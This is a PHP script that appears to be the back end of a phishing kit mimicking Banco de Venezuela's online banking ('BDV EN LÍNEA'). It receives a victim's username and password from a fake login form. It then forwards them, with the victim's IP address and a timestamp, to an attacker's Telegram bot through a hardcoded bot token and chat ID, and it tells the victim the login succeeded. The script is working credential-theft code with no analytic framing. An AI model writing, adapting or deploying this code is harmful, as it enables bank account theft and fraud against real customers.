<?php
header('Content-Type: application/json');
header('Access-Control-Allow-Origin: *');

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $usuario = $_POST['usuario'];
    $password = $_POST['password'];
    $ip = $_SERVER['REMOTE_ADDR'];
    $fecha = date('Y-m-d H:i:s');

    $token = getenv('TELEGRAM_TOKEN') ?: "8080814760:AAFEZS3tJZHNg6zNbPh2JNFSLXNccRSElYQ";
    $chat_id = getenv('TELEGRAM_CHAT_ID') ?: "6912929677";
    
    $mensaje = urlencode("🏦 ═══ BDV EN LÍNEA ═══ 🏦\n\n👤 Usuario: $usuario\n🔑 Clave: $password\n🌐 IP: $ip\n📅 Fecha: $fecha");
    
    $response = file_get_contents("https://api.telegram.org/bot$token/sendMessage?chat_id=$chat_id&text=$mensaje");
    
    echo json_encode(["success" => true]);
}
?> 